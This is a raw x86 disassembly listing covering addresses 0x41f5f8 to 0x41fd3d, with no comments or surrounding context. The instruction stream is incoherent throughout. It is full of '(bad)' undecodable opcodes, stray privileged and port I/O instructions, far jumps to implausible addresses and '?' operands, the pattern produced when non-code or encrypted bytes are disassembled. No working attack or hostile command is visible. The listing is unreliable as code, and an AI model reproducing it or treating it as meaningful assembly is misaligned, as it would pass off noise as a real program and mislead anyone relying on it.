  41f5f8:	push   0x9a5e6524
  41f5fd:	jno    0x41f5e2
  41f5ff:	repz imul cx,WORD PTR [ebp-0x57],0x73
  41f605:	cmp    BYTE PTR [eax+ebp*4],cl
  41f608:	and    eax,0x85191c32
  41f60d:	xchg   DWORD PTR [edx+ebp*8-0x25c9b8c2],ebp
  41f614:	cmp    al,0xb1
  41f616:	test   BYTE PTR [ebp-0x6e],dl
  41f619:	pop    eax
  41f61a:	push   es
  41f61b:	jnp    0x41f62f
  41f61d:	pusha  
  41f61e:	rcr    DWORD PTR [ebx],cl
  41f620:	iret   
  41f621:	adc    al,0x2f
  41f623:	jmp    0x6de3:0x9f13c600
  41f62a:	jmp    0xa55f0800
  41f62f:	xlat   BYTE PTR ds:[ebx]
  41f630:	xor    eax,0x50d2fa88
  41f635:	pop    esi
  41f636:	je     0x41f5c3
  41f638:	cmp    eax,0x8b62698
  41f63d:	cld    
  41f63e:	loop   0x41f686
  41f640:	cmp    al,0x7c
  41f642:	cmp    DWORD PTR [ebp+0x65],eax
  41f645:	test   al,0xd5
  41f647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f648:	mov    esp,0xf0c8bfc1
  41f64d:	xrelease mov DWORD PTR [eax+eax*2+0x4077281e],esp
  41f655:	cmp    eax,0x1d95d56c
  41f65a:	daa    
  41f65b:	lock jo 0x41f6d4
  41f65e:	das    
  41f65f:	and    BYTE PTR [esi],ah
  41f661:	call   0xd039:0xca79d205
  41f668:	int3   
  41f669:	xlat   BYTE PTR ds:[ebx]
  41f66a:	fsubr  QWORD PTR [eax-0x56]
  41f66d:	repnz outs dx,DWORD PTR ds:[esi]
  41f66f:	into   
  41f670:	(bad)  
  41f671:	fdivr  st,st(6)
  41f673:	pop    edx
  41f674:	jae    0x41f619
  41f676:	adc    bh,BYTE PTR [eax]
  41f678:	xor    bl,ah
  41f67a:	fldenv [eax+edx*8-0x13acb50]
  41f681:	(bad)  
  41f682:	ret    
  41f683:	jb     0x41f6d7
  41f685:	inc    edi
  41f686:	xchg   BYTE PTR [bp+di],dh
  41f689:	in     eax,0x54
  41f68b:	test   ecx,ecx
  41f68d:	std    
  41f68e:	inc    edi
  41f690:	inc    esp
  41f691:	sbb    al,0x7e
  41f693:	and    DWORD PTR [edx-0x375af751],esp
  41f699:	and    eax,0xa4fee894
  41f69e:	dec    edx
  41f69f:	mov    al,ds:0xe50502fb
  41f6a4:	jnp    0x41f6b1
  41f6a6:	loop   0x41f689
  41f6a8:	not    BYTE PTR [eax+0x5a3b9d50]
  41f6ae:	out    0xb0,al
  41f6b0:	mov    dl,0x9c
  41f6b2:	call   0xddb03e83
  41f6b7:	repnz sbb BYTE PTR [edx],al
  41f6ba:	mov    es,esp
  41f6bc:	gs push ss
  41f6be:	jno    0x41f6f1
  41f6c0:	ds div eax
  41f6c3:	cmp    eax,0xec563367
  41f6c8:	jmp    0xaa71:0xd94fe927
  41f6cf:	into   
  41f6d0:	les    esp,FWORD PTR [eax+0x3f34d19c]
  41f6d6:	xchg   dl,bl
  41f6d8:	xchg   edx,eax
  41f6d9:	add    BYTE PTR [eax],al
  41f6db:	add    BYTE PTR [ebp-0x15b01f1],bl
  41f6e1:	cmc    
  41f6e2:	fistp  QWORD PTR [edi]
  41f6e4:	stc    
  41f6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e6:	mov    bl,0x6e
  41f6e8:	pop    ebp
  41f6e9:	xchg   edx,eax
  41f6ea:	enter  0x9b04,0x73
  41f6ee:	add    DWORD PTR [eax],eax
  41f6f0:	test   DWORD PTR [edx],eax
  41f6f2:	add    BYTE PTR [eax],al
  41f6f4:	jnp    0x41f6e3
  41f6f6:	xor    al,0x15
  41f6f8:	scas   eax,DWORD PTR es:[edi]
  41f6f9:	jmp    0x40dd0c57
  41f6fe:	scas   eax,DWORD PTR es:[edi]
  41f6ff:	sub    al,0x72
  41f701:	stos   BYTE PTR es:[edi],al
  41f702:	mov    ebp,0xf1f2b489
  41f707:	mov    edi,0x841f25a6
  41f70c:	mov    esp,0x289ad1d
  41f711:	jo     0x41f723
  41f713:	shl    DWORD PTR [ecx+0x62],0x4f
  41f717:	dec    esp
  41f718:	add    BYTE PTR [ebp+ebp*2-0x1c],bl
  41f71c:	rcr    BYTE PTR [edx+0x5c],cl
  41f71f:	or     al,0x60
  41f721:	xchg   DWORD PTR [ebp-0x177cc69a],edi
  41f727:	dec    esp
  41f728:	jmp    0x41f6f2
  41f72a:	(bad)  
  41f72b:	pop    esp
  41f72c:	mov    esp,0x4bb43e6b
  41f731:	mov    ah,0x1d
  41f733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f734:	(bad)  
  41f735:	or     bh,bl
  41f737:	jmp    0x8bdd:0x18c2164a
  41f73e:	ins    BYTE PTR es:[edi],dx
  41f73f:	dec    esi
  41f740:	icebp  
  41f741:	repz mov esi,0x1d4440b1
  41f747:	(bad)  
  41f749:	mov    esp,0x30c1f79f
  41f74e:	dec    esi
  41f74f:	stos   DWORD PTR es:[edi],eax
  41f750:	in     al,0xc4
  41f752:	mov    ch,0xb9
  41f754:	jl     0x41f7ae
  41f756:	xor    al,0xf5
  41f758:	stc    
  41f759:	lahf   
  41f75a:	ror    DWORD PTR [ebp-0x36e86b2a],1
  41f760:	push   0x5dcb1405
  41f765:	faddp  st(7),st
  41f767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f768:	out    dx,al
  41f769:	push   0x5bb24ef0
  41f76e:	sub    BYTE PTR [eax-0x33],bl
  41f771:	pop    ss
  41f772:	imul   esp,DWORD PTR [ecx+0x0],0x2c9e3117
  41f779:	or     al,0x87
  41f77b:	xor    al,0x22
  41f77d:	adc    DWORD PTR [edx-0x45bb3290],edx
  41f783:	(bad)  
  41f784:	icebp  
  41f785:	or     al,0x65
  41f787:	rcl    cl,cl
  41f789:	push   ss
  41f78a:	jle    0x41f762
  41f78c:	nop
  41f78d:	pop    edx
  41f78e:	pop    ecx
  41f78f:	or     al,0xda
  41f791:	xchg   edx,eax
  41f792:	aad    0xe
  41f794:	push   cs
  41f795:	aam    0x2d
  41f797:	fwait
  41f798:	addr16 sbb ebp,ebx
  41f79b:	mov    edi,0x4c604a5d
  41f7a0:	je     0x41f7b6
  41f7a2:	pop    es
  41f7a3:	or     ch,BYTE PTR [ebp+esi*8+0xc]
  41f7a7:	jl     0x41f72c
  41f7a9:	icebp  
  41f7aa:	pop    ss
  41f7ab:	ret    
  41f7ac:	add    al,0x33
  41f7ae:	inc    ebp
  41f7af:	push   ss
  41f7b0:	imul   eax,esi,0xffffff9e
  41f7b3:	sbb    eax,eax
  41f7b5:	inc    ecx
  41f7b6:	imul   edi,eax,0x2e
  41f7b9:	in     al,dx
  41f7ba:	sahf   
  41f7bb:	or     dl,bl
  41f7bd:	and    al,0x3d
  41f7bf:	or     eax,0xee07e587
  41f7c4:	cmp    eax,0xc0eb6dd0
  41f7c9:	mov    al,ds:0x4691b27b
  41f7ce:	das    
  41f7cf:	or     edi,ebp
  41f7d1:	lods   eax,DWORD PTR ds:[esi]
  41f7d2:	hlt    
  41f7d3:	sahf   
  41f7d4:	popa   
  41f7d5:	push   cs
  41f7d6:	xchg   esi,eax
  41f7d7:	stos   DWORD PTR es:[edi],eax
  41f7d8:	inc    ecx
  41f7d9:	push   cs
  41f7da:	test   al,0xd8
  41f7dc:	or     BYTE PTR [esi],al
  41f7de:	lods   al,BYTE PTR ds:[esi]
  41f7df:	push   es
  41f7e0:	ror    DWORD PTR [edi+eax*8+0x2586072d],1
  41f7e7:	call   0x6fe904d6
  41f7ec:	mov    ?,WORD PTR [edx]
  41f7ee:	mov    ?,WORD PTR [ebx+0x42]
  41f7f1:	mov    esp,0x40f99658
  41f7f6:	enter  0x5bc2,0x7d
  41f7fa:	fmul   st(4),st
  41f7fc:	push   es
  41f7fd:	loop   0x41f7e4
  41f7ff:	cmc    
  41f800:	(bad)  
  41f801:	js     0x41f879
  41f803:	sub    ch,BYTE PTR [edi+0x7e]
  41f806:	mov    fs,WORD PTR ds:0x15cf6608
  41f80c:	je     0x41f7f9
  41f80e:	movhps xmm3,QWORD PTR [ecx-0x74]
  41f812:	mov    dl,dh
  41f814:	sti    
  41f815:	pop    edx
  41f816:	mov    ebx,0x5731a80f
  41f81b:	adc    BYTE PTR [edx-0x71],bh
  41f81e:	mov    bl,0xc5
  41f820:	push   ss
  41f821:	sub    ah,BYTE PTR [edx]
  41f823:	addr16 or dh,cl
  41f826:	or     dl,BYTE PTR [eax]
  41f828:	out    0xc7,al
  41f82a:	sbb    ebp,esi
  41f82c:	inc    esi
  41f82d:	sub    BYTE PTR [edi-0x20934e8],bh
  41f833:	push   ds
  41f834:	fdivr  QWORD PTR [ebp*8-0x21d51f35]
  41f83b:	leave  
  41f83c:	icebp  
  41f83d:	or     al,0xda
  41f83f:	push   edx
  41f840:	add    DWORD PTR [edx+0x466807b6],ebp
  41f846:	mov    esp,0xda49e10d
  41f84b:	pop    ss
  41f84c:	outs   dx,DWORD PTR ds:[esi]
  41f84d:	jae    0x41f7d4
  41f84f:	inc    eax
  41f850:	gs push esp
  41f852:	xchg   ebp,eax
  41f853:	sub    dl,bh
  41f855:	call   ecx
  41f857:	mov    ds:0x4d073b83,al
  41f85c:	adc    BYTE PTR [edx+0x5234db96],dh
  41f862:	int3   
  41f863:	test   eax,0x2445cbf2
  41f868:	mov    ch,0x5b
  41f86a:	fwait
  41f86b:	test   edi,0xd1fefe4c
  41f871:	aam    0xf2
  41f873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f874:	sub    eax,0x37022196
  41f879:	xchg   ecx,eax
  41f87a:	ror    DWORD PTR [eax],0x2d
  41f87d:	stc    
  41f87e:	imul   DWORD PTR [eax-0x15cedf42]
  41f884:	iret   
  41f885:	add    dl,BYTE PTR [esi-0xd55b5c6]
  41f88b:	cmp    eax,0x70fc233
  41f890:	jnp    0x41f8d0
  41f892:	inc    edi
  41f893:	push   ds
  41f894:	cmp    al,0xe2
  41f896:	mov    bl,BYTE PTR [edi+0x52adcc2a]
  41f89c:	mov    ch,0xa4
  41f89e:	adc    BYTE PTR ds:0x9137b0a7,ah
  41f8a4:	xor    DWORD PTR [edi],esi
  41f8a6:	jp     0x41f85d
  41f8a8:	adc    dh,ch
  41f8aa:	(bad)  
  41f8ab:	into   
  41f8ac:	jmp    0x577b:0x66095859
  41f8b3:	ret    
  41f8b4:	ins    BYTE PTR es:[edi],dx
  41f8b5:	push   0x25
  41f8b7:	sbb    dl,dl
  41f8b9:	adc    al,0x4e
  41f8bb:	cmp    eax,0x425ef017
  41f8c0:	or     eax,0x5bd2ed95
  41f8c5:	(bad)  
  41f8c6:	es push ebx
  41f8c8:	jo     0x41f8cf
  41f8ca:	xchg   edx,eax
  41f8cb:	scas   eax,DWORD PTR es:[edi]
  41f8cc:	dec    ebp
  41f8cd:	mov    edx,0xff759498
  41f8d2:	out    dx,eax
  41f8d3:	mov    BYTE PTR ds:0x473fc659,bl
  41f8d9:	mov    ah,bh
  41f8db:	mov    ?,WORD PTR [ebp+0x13]
  41f8de:	jp     0x41f8aa
  41f8e0:	sub    al,0xe7
  41f8e2:	and    ch,cl
  41f8e4:	jne    0x41f8b5
  41f8e6:	sbb    eax,0xffa29499
  41f8eb:	and    BYTE PTR [ebp-0x5a],al
  41f8ee:	(bad)  
  41f8ef:	retf   
  41f8f0:	fmul   DWORD PTR [edi+0x44]
  41f8f3:	pop    ebx
  41f8f4:	push   0xffffffb6
  41f8f6:	in     eax,0x4c
  41f8f8:	xor    esi,edx
  41f8fa:	jns    0x41f8cf
  41f8fc:	and    dl,dh
  41f8fe:	dec    ebx
  41f8ff:	test   BYTE PTR [ecx-0x26],0x58
  41f903:	inc    eax
  41f904:	inc    ecx
  41f905:	pop    ebx
  41f906:	hlt    
  41f907:	dec    ebx
  41f908:	xchg   edx,eax
  41f909:	inc    esi
  41f90a:	sbb    BYTE PTR ds:0x74fde826,bl
  41f910:	push   edx
  41f911:	or     eax,0x60716d2
  41f916:	gs jg  0x41f931
  41f919:	js     0x41f921
  41f91b:	jno    0x41f91a
  41f91d:	or     eax,0x1c84239b
  41f922:	stos   DWORD PTR es:[edi],eax
  41f923:	cdq    
  41f924:	inc    ecx
  41f925:	cmp    cl,BYTE PTR ds:[esi-0x5df0eb47]
  41f92c:	xor    al,0xc
  41f92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92f:	xlat   BYTE PTR ds:[ebx]
  41f930:	adc    ch,dh
  41f932:	or     eax,0xbefc7b41
  41f937:	xor    ebx,DWORD PTR [ebx-0x7e]
  41f93a:	rol    bh,cl
  41f93c:	mov    eax,0x38aa04bf
  41f941:	loope  0x41f90f
  41f943:	data16 js 0x41f8ef
  41f946:	loop   0x41f9b5
  41f948:	outs   dx,BYTE PTR ds:[esi]
  41f949:	es cli 
  41f94b:	dec    eax
  41f94c:	mov    al,ds:0x6769cb30
  41f951:	lods   eax,DWORD PTR ds:[esi]
  41f952:	fldcw  WORD PTR [ebx+0x3e]
  41f955:	lock xchg ebx,eax
  41f957:	push   0x5785739c
  41f95c:	fdiv   QWORD PTR [esi+0x49d2854d]
  41f962:	jns    0x41f9de
  41f964:	push   ebp
  41f965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f966:	ficomp WORD PTR [ebx+0x435dac32]
  41f96c:	mov    eax,0x26601b71
  41f971:	fiadd  WORD PTR [esi-0x3b658d26]
  41f977:	dec    esi
  41f978:	push   ss
  41f979:	add    BYTE PTR [eax],al
  41f97b:	add    BYTE PTR [eax],ah
  41f97d:	push   ss
  41f97e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97f:	lea    esi,[esi+0x25bf29bf]
  41f985:	lods   eax,DWORD PTR ds:[esi]
  41f986:	and    dl,al
  41f988:	jno    0x41f98a
  41f98a:	sub    dh,BYTE PTR [edx]
  41f98c:	and    BYTE PTR [esi+0x1],dh
  41f98f:	add    BYTE PTR [ebp-0x29fffffe],al
  41f995:	sub    eax,0x706356d1
  41f99a:	sbb    al,0xe
  41f99c:	scas   al,BYTE PTR es:[edi]
  41f99d:	popf   
  41f99e:	(bad)  
  41f99f:	and    cl,BYTE PTR ds:0x974a7685
  41f9a5:	push   ebp
  41f9a6:	push   esi
  41f9a7:	jecxz  0x41f937
  41f9a9:	sub    DWORD PTR [edi-0x4ba59fe8],0x37
  41f9b0:	iret   
  41f9b1:	rol    DWORD PTR [esi-0x52],1
  41f9b4:	gs jnp 0x41fa21
  41f9b7:	retf   0x1568
  41f9ba:	(bad)  
  41f9bc:	cld    
  41f9bd:	aaa    
  41f9be:	xchg   edi,eax
  41f9bf:	adc    BYTE PTR [edx],ah
  41f9c1:	dec    edi
  41f9c2:	std    
  41f9c3:	(bad)  
  41f9c4:	ja     0x41f9c5
  41f9c6:	mov    ch,0x6c
  41f9c8:	outs   dx,BYTE PTR ds:[esi]
  41f9c9:	aas    
  41f9ca:	jge    0x41fa3b
  41f9cc:	jmp    0xe76a:0x9fb4e02f
  41f9d3:	loope  0x41fa1c
  41f9d5:	pop    esi
  41f9d6:	jmp    FWORD PTR [esi-0x642216d2]
  41f9dc:	mov    ebx,fs
  41f9de:	sbb    cl,dl
  41f9e0:	adc    esi,DWORD PTR [ecx+0x5e]
  41f9e3:	push   eax
  41f9e4:	in     eax,0xf5
  41f9e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9e7:	mov    dh,0x8d
  41f9e9:	sbb    al,0x7a
  41f9eb:	push   0xffffffdb
  41f9ed:	mov    cl,0x94
  41f9ef:	jbe    0x41fa6b
  41f9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9f2:	sub    BYTE PTR [ebp-0x1],0xab
  41f9f6:	out    dx,al
  41f9f7:	repnz sar ecx,0x6c
  41f9fb:	(bad)  
  41f9fc:	(bad)  
  41f9fd:	jno    0x41fa2e
  41f9ff:	jns    0x41fa4f
  41fa01:	cmp    al,0x72
  41fa03:	sub    eax,0x270671aa
  41fa08:	add    ch,BYTE PTR [ecx]
  41fa0a:	mov    DWORD PTR [esi+0x2de0ddb8],ebp
  41fa10:	aad    0x32
  41fa12:	dec    eax
  41fa13:	shl    DWORD PTR [ecx+0x5c],0xea
  41fa17:	mov    ds:0x1537c0de,eax
  41fa1c:	imul   edx,DWORD PTR [eax+0x7be369b],0xffffffbd
  41fa23:	ins    BYTE PTR es:[edi],dx
  41fa24:	add    al,0xfe
  41fa26:	lods   al,BYTE PTR ds:[esi]
  41fa27:	(bad)  
  41fa28:	imul   DWORD PTR [ebp-0x14]
  41fa2b:	into   
  41fa2c:	shr    DWORD PTR [ebx+0x1096776],0xbd
  41fa33:	out    dx,al
  41fa34:	mov    esi,0xaf5b77ac
  41fa39:	in     eax,0x99
  41fa3b:	outs   dx,BYTE PTR ds:[esi]
  41fa3c:	jp     0x41fab3
  41fa3e:	mov    BYTE PTR [ebp+0x4b],0x33
  41fa42:	inc    edi
  41fa43:	add    esp,DWORD PTR [edx-0x2c]
  41fa46:	pop    eax
  41fa47:	dec    eax
  41fa48:	fmul   DWORD PTR [ebp+0x6216237b]
  41fa4e:	push   cs
  41fa4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa50:	mov    esi,0xbbf9e8d1
  41fa55:	fdiv   DWORD PTR [ebx]
  41fa57:	cld    
  41fa58:	mov    cl,0xa
  41fa5a:	push   0xffffff8a
  41fa5c:	push   esp
  41fa5d:	dec    ebp
  41fa5e:	(bad)  [ecx]
  41fa60:	mov    al,0x24
  41fa62:	test   eax,0x70e7f4cd
  41fa67:	into   
  41fa68:	cmp    DWORD PTR ds:0x2d6081e,esp
  41fa6e:	push   esp
  41fa6f:	mov    dh,0x59
  41fa71:	sbb    DWORD PTR [esi+0x7769eaac],edi
  41fa77:	add    DWORD PTR [ecx-0x8],esp
  41fa7a:	(bad)
  41fa7e:	cli    
  41fa7f:	dec    ebx
  41fa80:	leave  
  41fa81:	adc    BYTE PTR [ecx-0x53ecc5a8],al
  41fa87:	push   cs
  41fa88:	es out 0x52,al
  41fa8b:	scas   eax,DWORD PTR es:[edi]
  41fa8c:	cmp    al,BYTE PTR ds:0xdeb65bb2
  41fa92:	sub    esi,edi
  41fa94:	and    ecx,0xdcd540b4
  41fa9a:	outs   dx,BYTE PTR ds:[esi]
  41fa9b:	cli    
  41fa9c:	inc    ecx
  41fa9d:	out    0x63,al
  41fa9f:	pop    es
  41faa0:	fcomp  QWORD PTR [eax+ebx*4+0x2e6f407f]
  41faa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa8:	pop    esi
  41faa9:	mov    eax,0x9cf37f6d
  41faae:	into   
  41faaf:	push   edi
  41fab0:	dec    ebx
  41fab1:	mov    al,0x72
  41fab3:	pop    ss
  41fab4:	pop    ss
  41fab5:	pop    ds
  41fab6:	ds (bad) 
  41fab8:	fcomp  QWORD PTR [edi+0x2d]
  41fabb:	fbstp  TBYTE PTR [eax-0x16554c2]
  41fac1:	pop    eax
  41fac2:	loop   0x41fa5a
  41fac4:	cmp    DWORD PTR [edi],esp
  41fac6:	mov    edi,0x26a60f82
  41facb:	adc    al,0x21
  41facd:	mov    eax,0x6b7107ee
  41fad2:	lock xchg BYTE PTR [ecx],bh
  41fad5:	sbb    DWORD PTR [ebp+0xa11d822],esi
  41fadb:	sub    esi,edi
  41fadd:	sub    DWORD PTR [esi+0x60],eax
  41fae0:	cdq    
  41fae1:	xchg   esp,eax
  41fae2:	imul   edx,DWORD PTR [ecx+edx*8-0x557e464f],0x20
  41faea:	ds test esi,edx
  41faed:	ins    BYTE PTR es:[edi],dx
  41faee:	(bad)  
  41faf0:	lods   eax,DWORD PTR ds:[esi]
  41faf1:	jge    0x41fafd
  41faf3:	mov    esp,0xc927ae03
  41faf8:	mov    ds:0x29e24762,eax
  41fafd:	out    dx,al
  41fafe:	sub    bl,ch
  41fb00:	adc    DWORD PTR [ecx],ebp
  41fb02:	push   ecx
  41fb03:	pop    edi
  41fb04:	rcr    BYTE PTR [edx+0x4ad44f1a],1
  41fb0a:	call   0xbd47deac
  41fb0f:	cmp    eax,0x9c1deb78
  41fb14:	int3   
  41fb15:	xor    cl,BYTE PTR [edx+eax*1-0x3d34fe94]
  41fb1c:	cs sub eax,0x28febf37
  41fb22:	scas   al,BYTE PTR es:[edi]
  41fb23:	jb     0x41fb08
  41fb25:	(bad)  
  41fb26:	dec    eax
  41fb27:	add    al,0x75
  41fb29:	js     0x41fb90
  41fb2b:	jp     0x41fb72
  41fb2d:	sub    ebx,DWORD PTR [ebx]
  41fb2f:	shr    BYTE PTR [esp+esi*1-0x4b],cl
  41fb33:	popa   
  41fb34:	call   DWORD PTR [ebp+0x5b]
  41fb37:	ins    DWORD PTR es:[edi],dx
  41fb38:	mov    ebp,0xbd78e91c
  41fb3d:	sub    DWORD PTR [eax+0x5f],ebp
  41fb40:	adc    ch,cl
  41fb42:	pop    ebp
  41fb43:	jnp    0x41fafb
  41fb45:	push   esp
  41fb46:	nop
  41fb47:	imul   edi,DWORD PTR [ebx+0x3f82755e],0xffffff8d
  41fb4e:	and    eax,DWORD PTR [edi-0x70]
  41fb51:	je     0x41fb56
  41fb53:	imul   ebx,DWORD PTR [ebp+ebx*1-0x38],0x363fc600
  41fb5b:	inc    ebp
  41fb5c:	ins    DWORD PTR es:[edi],dx
  41fb5d:	jp     0x41fb8d
  41fb5f:	or     al,0xa8
  41fb61:	shr    DWORD PTR [edx-0x2d],cl
  41fb64:	fdiv   QWORD PTR [eax-0x47]
  41fb67:	mov    esi,0x91d2c696
  41fb6c:	sahf   
  41fb6d:	(bad)  
  41fb6e:	fsubr  QWORD PTR ds:0xc561901e
  41fb74:	xchg   ecx,eax
  41fb75:	cs sbb eax,0xb5becb6
  41fb7b:	push   0x7a17a667
  41fb80:	inc    ebx
  41fb81:	dec    DWORD PTR [eax-0x76ef5422]
  41fb87:	xor    ebp,edi
  41fb89:	mov    ch,0x12
  41fb8b:	shl    DWORD PTR [ebp+0x17],cl
  41fb8e:	fwait
  41fb8f:	xor    DWORD PTR [edx],ebp
  41fb91:	dec    esi
  41fb92:	ja     0x41fb15
  41fb94:	and    al,0xb2
  41fb96:	fldcw  WORD PTR [esi-0x51]
  41fb99:	les    esi,FWORD PTR [eax-0x3c]
  41fb9c:	add    ebp,ecx
  41fb9e:	sub    ebp,edi
  41fba0:	ins    DWORD PTR es:[edi],dx
  41fba1:	add    al,0xaa
  41fba3:	jl     0x41fbfc
  41fba5:	ins    BYTE PTR es:[edi],dx
  41fba6:	repz cld 
  41fba8:	add    edx,DWORD PTR [esi-0x3c]
  41fbab:	pop    ds
  41fbac:	stos   BYTE PTR es:[edi],al
  41fbad:	push   ebx
  41fbae:	adc    al,0xef
  41fbb0:	cmp    eax,DWORD PTR [ebp+ecx*1-0x47]
  41fbb4:	mov    esi,0x655b2b6
  41fbb9:	pop    ss
  41fbba:	dec    ebp
  41fbbb:	in     al,dx
  41fbbc:	push   ss
  41fbbd:	and    al,0x26
  41fbbf:	sti    
  41fbc0:	or     BYTE PTR [ebp+0x73323887],al
  41fbc6:	push   edi
  41fbc7:	push   ecx
  41fbc8:	fist   DWORD PTR [esi+0x580a3dd0]
  41fbce:	fwait
  41fbcf:	mov    al,ds:0xec444905
  41fbd4:	in     al,0x7a
  41fbd6:	call   DWORD PTR [edx+0x2a]
  41fbd9:	hlt    
  41fbda:	pop    ds
  41fbdb:	sbb    BYTE PTR [esi+0x77],0x8e
  41fbdf:	xchg   esp,eax
  41fbe0:	jo     0x41fc01
  41fbe2:	ret    0xea16
  41fbe5:	ins    DWORD PTR es:[edi],dx
  41fbe6:	mov    bl,0x55
  41fbe8:	cmp    eax,0x61a4bc22
  41fbed:	scas   al,BYTE PTR es:[edi]
  41fbee:	stc    
  41fbef:	and    DWORD PTR [eax],esi
  41fbf1:	adc    al,0x5a
  41fbf3:	mov    ds:0xad5790d7,al
  41fbf8:	(bad)  
  41fbf9:	(bad)  
  41fbfa:	mov    edi,DWORD PTR [ebp+0x6c06a36b]
  41fc00:	cld    
  41fc01:	or     al,0x55
  41fc03:	enter  0xd7d8,0x9
  41fc07:	mov    edi,0x97a978d9
  41fc0c:	leave  
  41fc0d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41fc0f:	push   0xffffffd0
  41fc11:	add    DWORD PTR fs:[edi+0x34],edi
  41fc15:	cwde   
  41fc16:	sub    bh,BYTE PTR [eax+0xe5]
  41fc1c:	mov    al,0x33
  41fc1e:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  41fc24:	test   DWORD PTR [edi-0x1647f342],esi
  41fc2a:	pop    ds
  41fc2b:	sbb    al,0xa5
  41fc2d:	js     0x41fc30
  41fc2f:	add    BYTE PTR [ebp-0x63fffffe],al
  41fc35:	das    
  41fc36:	fld    st(2)
  41fc38:	mov    edx,DWORD PTR [eax]
  41fc3a:	cmp    DWORD PTR [ebx+0x10],edi
  41fc3d:	imul   ebx,DWORD PTR [edi+0x3d],0xffffffd6
  41fc41:	ins    DWORD PTR es:[edi],dx
  41fc42:	enter  0x76de,0x80
  41fc46:	cs mov esi,0x4f99704d
  41fc4c:	fimul  WORD PTR [edi-0x2c]
  41fc4f:	or     DWORD PTR [esi+eax*8-0x51],esi
  41fc53:	lock sub DWORD PTR [edi-0x3b],esi
  41fc57:	das    
  41fc58:	ret    
  41fc59:	shl    BYTE PTR [eax],cl
  41fc5b:	add    esp,ebx
  41fc5d:	pop    eax
  41fc5e:	xlat   BYTE PTR ds:[ebx]
  41fc5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc60:	aaa    
  41fc61:	inc    ebp
  41fc62:	mov    bl,0x49
  41fc64:	push   ebp
  41fc65:	je     0x41fcd2
  41fc67:	cmp    BYTE PTR [ebx+0x31],ch
  41fc6a:	pop    ss
  41fc6b:	sar    BYTE PTR [ebx],0xc5
  41fc6e:	jae    0x41fc52
  41fc70:	popf   
  41fc71:	fwait
  41fc72:	jae    0x41fc2c
  41fc74:	dec    esi
  41fc75:	xchg   ecx,eax
  41fc76:	gs iret 
  41fc78:	pop    eax
  41fc79:	sub    DWORD PTR ds:0x8b96ddc7,ecx
  41fc7f:	jmp    0x86dbcd5b
  41fc84:	sub    eax,0xb4653cc4
  41fc89:	pop    esi
  41fc8a:	mov    ch,0x76
  41fc8c:	scas   al,BYTE PTR es:[edi]
  41fc8d:	jmp    0x41fcc9
  41fc8f:	jae    0x41fc89
  41fc91:	jnp    0x41fd03
  41fc93:	and    DWORD PTR [ecx+0x1b],ebx
  41fc96:	ret    0x3dd8
  41fc99:	(bad)  
  41fc9a:	jp     0x41fc93
  41fc9c:	setbe  ch
  41fc9f:	in     eax,0x94
  41fca1:	in     eax,dx
  41fca2:	dec    ebp
  41fca3:	sub    al,0xb4
  41fca5:	scas   eax,DWORD PTR es:[edi]
  41fca6:	push   ss
  41fca7:	lds    eax,FWORD PTR [ecx+eiz*2]
  41fcaa:	jb     0x41fc91
  41fcac:	sub    ebp,ecx
  41fcae:	inc    ecx
  41fcaf:	inc    eax
  41fcb0:	mov    bl,0x73
  41fcb2:	int3   
  41fcb3:	jnp    0x41fc9d
  41fcb5:	dec    esi
  41fcb6:	(bad)
  41fcb9:	jg     0x41fc84
  41fcbb:	add    eax,0xf19b1f30
  41fcc0:	(bad)  
  41fcc1:	loope  0x41fc94
  41fcc3:	push   ebx
  41fcc4:	push   0xffffff94
  41fcc6:	inc    ebp
  41fcc7:	int3   
  41fcc8:	cmp    dh,dh
  41fcca:	(bad)  
  41fccb:	mov    dl,0x5b
  41fccd:	not    DWORD PTR [edi-0x2ef98223]
  41fcd3:	out    0xb7,eax
  41fcd5:	sar    BYTE PTR [edi],1
  41fcd7:	adc    DWORD PTR [edi+edx*1-0x23],0x894c6d08
  41fcdf:	add    cl,BYTE PTR [edi-0x3d851540]
  41fce5:	ret    
  41fce6:	or     BYTE PTR [edx],cl
  41fce8:	sub    BYTE PTR [edx+0x3f],bl
  41fceb:	(bad)  
  41fcec:	out    dx,eax
  41fced:	fistp  DWORD PTR [eax]
  41fcef:	int3   
  41fcf0:	mov    eax,ds:0x2b9bbab3
  41fcf5:	lds    ecx,FWORD PTR [esi]
  41fcf7:	inc    edi
  41fcf8:	pop    es
  41fcf9:	xlat   BYTE PTR ds:[ebx]
  41fcfa:	ds scas al,BYTE PTR es:[edi]
  41fcfc:	outs   dx,DWORD PTR ds:[esi]
  41fcfd:	pop    ss
  41fcfe:	jg     0x41fce0
  41fd00:	inc    ebx
  41fd01:	pop    ecx
  41fd02:	les    ecx,FWORD PTR [edi+ebp*8+0x27]
  41fd06:	out    dx,eax
  41fd07:	pop    ds
  41fd08:	leave  
  41fd09:	and    eax,0x3f25adc
  41fd0e:	call   0xcdc8860f
  41fd13:	jne    0x41fd69
  41fd15:	shr    BYTE PTR [eax-0x560811d4],cl
  41fd1b:	inc    edi
  41fd1c:	jmp    0x2bdf1d2e
  41fd21:	neg    BYTE PTR [edx-0x7b]
  41fd24:	inc    edx
  41fd25:	dec    edx
  41fd26:	cwde   
  41fd27:	mov    al,al
  41fd29:	stos   DWORD PTR es:[edi],eax
  41fd2a:	jo     0x41fcd0
  41fd2c:	stos   BYTE PTR es:[edi],al
  41fd2d:	inc    eax
  41fd2e:	jmp    0xe89018e2
  41fd33:	dec    BYTE PTR ds:0x8784ca24
  41fd39:	mov    bh,0x6
  41fd3b:	in     eax,dx
  41fd3c:	scas   eax,DWORD PTR es:[edi]
  41fd3d:	lods   al,BYTE PTR ds:[esi]
